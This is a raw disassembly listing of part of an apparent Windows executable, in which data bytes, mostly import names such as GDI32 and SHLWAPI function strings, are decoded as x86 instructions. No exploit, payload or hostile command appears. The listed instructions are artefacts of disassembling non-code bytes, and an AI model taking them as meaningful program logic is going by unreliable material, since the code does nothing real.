  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
